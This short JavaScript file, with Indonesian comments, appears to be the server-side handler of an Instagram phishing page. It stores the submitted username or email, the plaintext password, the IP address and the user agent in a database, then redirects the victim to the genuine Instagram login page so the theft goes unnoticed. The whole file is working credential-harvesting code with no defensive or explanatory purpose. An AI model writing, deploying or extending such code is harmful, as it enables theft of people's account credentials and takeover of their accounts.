import { saveData } from '../database/query.js';

export function handleLogin(req, res) {
    const username = req.body.username || req.body.email || 'Unknown';
    const password = req.body.password || 'Unknown';
    const ip = req.clientIp;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    // Simpan ke database
    saveData(username, password, ip, userAgent);
    
    // Redirect ke Instagram asli
    res.redirect('https://www.instagram.com/accounts/login/');
}